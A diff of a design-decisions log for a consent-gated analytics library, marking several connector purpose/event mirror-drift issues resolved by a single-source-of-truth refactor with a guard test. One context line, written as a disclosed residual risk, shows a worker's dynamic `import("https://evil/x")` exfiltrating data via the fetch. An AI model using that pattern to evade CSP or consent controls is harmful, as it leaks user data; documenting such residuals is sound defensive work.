@@ -371,12 +371,14 @@ defense-in-depth strip. Recorded in [ADR-0013](decisions/adr-0013-alloy-consent-
   (asserting the interact is suppressed) + wiring `rig/alloy-core-host-harness.html` /
   `alloy-coalescing-core-harness.html` to pass `consent`/`egressPurposes`/`payloadDenylist` for a
   live/browser exercise is a named creds-gated follow-on (013 infra).
-- **Purpose-list mirror drift** — alloy's collect-governing purposes are stated in THREE places
-  (`connectors/alloy/connector.js`'s manifest `purposes.egress`, `connectors/alloy/consent.js`'s
-  `COLLECT_PURPOSES`, and each caller's injected `egressPurposes`), a documented-but-unenforced mirror
-  (the same accepted idiom as GA4's `DATA_USE_PURPOSES`). A manifest change silently diverges the two
-  levers; no test guards it. Resolution trigger: if `purposes.egress` ever changes, or on a third such
-  connector (rule-of-three → a shared accessor).
+- ~~**Purpose-list mirror drift**~~ — **RESOLVED 2026-09-14 (structural SOT refactor).** alloy's manifest
+  `purposes.egress` and the adapter's injected `egressPurposes` are now the SAME frozen exported const
+  `ALLOY_EGRESS_PURPOSES` (`connectors/alloy/connector.js`), guarded by a reference-identity test
+  (`test/connector-manifest-vocab-sot.test.js`) — so a manifest change can no longer silently diverge them.
+  The third cited place, `connectors/alloy/consent.js`'s `COLLECT_PURPOSES`, **no longer exists** in the
+  source (stale reference — the grep is empty), so alloy's egress purposes now live in exactly one home.
+  (The value is unchanged: `["analytics_storage", "personalization"]`.) Original note (pre-fix): the purposes
+  were a documented-but-unenforced mirror across places, the same accepted idiom as GA4's `DATA_USE_PURPOSES`.
 - **The disclosed dynamic-`import()` residual** (016, worker CSP) bounds the "held at the seam" trust
   claim for ALL seam controls (ceiling / config-integrity / consent), not just consent — a `type:"module"`
   worker's `await import("https://evil/x")` exfiltrates via the specifier fetch, which no JS shim withholds;
@@ -495,14 +497,23 @@ the event; this is about GA4's *intended* catch-all, not a leak.)
 **Resolution trigger:** a real adopter needs event-name→connector routing the built-in capture + `push()` don't
 cover; or that later config-surface freeze.
 
-### Decision: `*_MANIFEST_EVENTS` single source of truth — DEFERRED (craft nit)
-**Deferred:** `boot(config)`'s fan-out gate uses local mirrors `GA4_MANIFEST_EVENTS = ["*"]` /
-`HELIX_RUM_MANIFEST_EVENTS = ["top","error","cwv"]` of the connectors' own `manifest.events`, kept correct by a
-"keep in sync" comment (the pixel path avoids this by deriving from the vendor factory). A single source of truth
-(importing the vocabularies from the connector modules — whose manifests are instance-constructed inside factories)
-would remove the drift risk. Pragmatic pre-1.0 choice.
+### ~~Decision: `*_MANIFEST_EVENTS` single source of truth — DEFERRED (craft nit)~~ — RESOLVED 2026-09-14
+
+**RESOLVED 2026-09-14 (structural SOT refactor).** Each connector now EXPORTS its declared vocabulary from its own
+module — `GA4_EVENTS`/`GA4_EGRESS_PURPOSES` (`connectors/ga4/connector.js`), `GA4_GTAG_EVENTS`/`GA4_GTAG_EGRESS_PURPOSES`
+(`ga4/gtag.js`), `HELIX_RUM_EVENTS` (`helix-rum/connector.js`), `GOOGLE_ADS_EVENTS`/`GOOGLE_ADS_EGRESS_PURPOSES`,
+`FLOODLIGHT_EVENTS`/`FLOODLIGHT_EGRESS_PURPOSES`, `ALLOY_EVENTS`/`ALLOY_EGRESS_PURPOSES` — as a FROZEN const the
+connector's OWN `manifest.events`/`manifest.purposes.egress` references AND `adapters/eds/index.js` imports. The adapter's
+prior hand-maintained `*_MANIFEST_EVENTS`/`*_EGRESS_PURPOSES` mirror consts are DELETED; the manifest and the adapter now
+share the SAME reference, so drift is structurally impossible (no "keep in sync" comment). Locked by a reference-identity
+guard: `test/connector-manifest-vocab-sot.test.js` asserts `manifest.events === X_EVENTS` (and egress) per connector, so a
+future re-inlined literal fails loudly (mutation-verified). Full suite + `node build.mjs` green (the adapter now
+transitively imports `ga4/connector.js` → tree-shaken to the vocab consts). **Original deferral note (pre-fix):** the
+adapter's fan-out gate used hand-maintained mirrors of the connectors' own `manifest.events`, kept correct by a comment;
+the pixel path already avoided this by deriving from the vendor factory.
 **Resolution trigger:** helix-rum's checkpoint set widens again (spec 022-05), or a third connector needs a
-non-`["*"]` vocabulary — extract the shared accessor then (rule-of-three).
+non-`["*"]` vocabulary. _(No longer applicable — the vocabularies are now imported from the one home; widening a checkpoint
+set is a single edit there.)_
 
 ### ~~Decision: Composite read-namespacing + `sampled` surfacing — DEFERRED (minor)~~ — RULED 2026-09-05 (spec 037-01)
 ~~**Deferred:** the composite `getState`/`stats` read `handles[0]` (declaration-order-coupled; documented), and the
@@ -1060,9 +1071,15 @@ entry originally only "considered" is now BUILT: a new "048-01 CROSS-CHECK" test
 exported) equals the schema's enumerated connector `type` consts — shown red against the pre-fix schema (missing
 `google-ads`), so this exact drift shape cannot silently recur for 048-02 (floodlight) or any later connector.
 
-### The manifest `purposes`/`endpoints` mirror-drift residual — applies to google-ads too (not new, not widened)
+### ~~The manifest `purposes`/`endpoints` mirror-drift residual — applies to google-ads too~~ — RESOLVED 2026-09-14
 
-**Noted (048-01, 2026-09-14):** `GOOGLE_ADS_EGRESS_PURPOSES` (`["ad_storage"]`) and `GOOGLE_ADS_MANIFEST_EVENTS`
+**RESOLVED 2026-09-14 (structural SOT refactor — see the `*_MANIFEST_EVENTS` single-source-of-truth entry above).**
+google-ads' `events`/`egressPurposes` are now the exported `GOOGLE_ADS_EVENTS`/`GOOGLE_ADS_EGRESS_PURPOSES`
+(`connectors/google-ads/connector.js`), the SAME frozen reference the manifest declares AND `adapters/eds/index.js`
+imports — the adapter mirror consts are deleted. (The `endpoints` half was never a hand-mirror: the endpoint URL
+`GOOGLE_ADS_CCM_COLLECT_ENDPOINT` was already imported.) Original note (pre-fix):
+
+~~**Noted (048-01, 2026-09-14):**~~ `GOOGLE_ADS_EGRESS_PURPOSES` (`["ad_storage"]`) and `GOOGLE_ADS_MANIFEST_EVENTS`
 (`["page_view"]`) in `adapters/eds/index.js` are hardcoded consts kept in sync BY HAND with
 `connectors/google-ads/connector.js`'s own `manifest.purposes.egress` / `manifest.events` — the SAME standing pattern
 `GA4_EGRESS_PURPOSES`/`GA4_GTAG_MANIFEST_EVENTS`/`HELIX_RUM_MANIFEST_EVENTS` already accept (no connector's manifest is
@@ -1139,9 +1156,14 @@ gates the whole activity form on `src` via `hasActivityIdentity`). Consistent wi
 not required by any 048-02 AC, so left as-is — but a loud "activityType/cat set without src → activity beacon will not fire"
 validation warning would close the config footgun. Small, non-blocking; do it when the floodlight boot config is next touched.
 
-### The manifest `purposes`/`endpoints` mirror-drift residual — applies to floodlight too (not new, not widened)
+### ~~The manifest `purposes`/`endpoints` mirror-drift residual — applies to floodlight too~~ — RESOLVED 2026-09-14
 
-**Noted (048-02, 2026-09-14):** `FLOODLIGHT_EGRESS_PURPOSES` (`["ad_storage"]`) and `FLOODLIGHT_MANIFEST_EVENTS`
+**RESOLVED 2026-09-14 (structural SOT refactor — see the `*_MANIFEST_EVENTS` single-source-of-truth entry above).**
+floodlight's `events`/`egressPurposes` are now the exported `FLOODLIGHT_EVENTS`/`FLOODLIGHT_EGRESS_PURPOSES`
+(`connectors/floodlight/connector.js`), the SAME frozen reference the manifest declares AND the adapter imports; the
+adapter mirror consts are deleted (guarded by `test/connector-manifest-vocab-sot.test.js`). Original note (pre-fix):
+
+~~**Noted (048-02, 2026-09-14):**~~ `FLOODLIGHT_EGRESS_PURPOSES` (`["ad_storage"]`) and `FLOODLIGHT_MANIFEST_EVENTS`
 (`["page_view"]`) in `adapters/eds/index.js` are hardcoded consts kept in sync BY HAND with
 `connectors/floodlight/connector.js`'s own `manifest.purposes.egress` / `manifest.events` — the SAME standing pattern
 `GOOGLE_ADS_EGRESS_PURPOSES`/`GOOGLE_ADS_MANIFEST_EVENTS`/`GA4_GTAG_MANIFEST_EVENTS`/`HELIX_RUM_MANIFEST_EVENTS` already
